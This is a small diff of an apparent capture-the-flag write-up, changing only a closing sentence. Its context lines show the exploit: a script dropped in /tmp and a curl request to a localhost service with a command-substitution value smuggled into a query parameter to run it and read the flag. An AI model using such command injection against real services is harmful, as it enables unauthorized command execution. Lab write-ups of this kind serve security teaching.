@@ -117,4 +117,4 @@ $ echo 'getflag > /tmp/checkflag' > /tmp/EXPLOIT && chmod +x /tmp/EXPLOIT
 $ curl localhost:4646?x='$(/*/EXPLOIT)'; cat /tmp/checkflag
 ```
 
-And there is our flag ! :)
+And there is our flag !
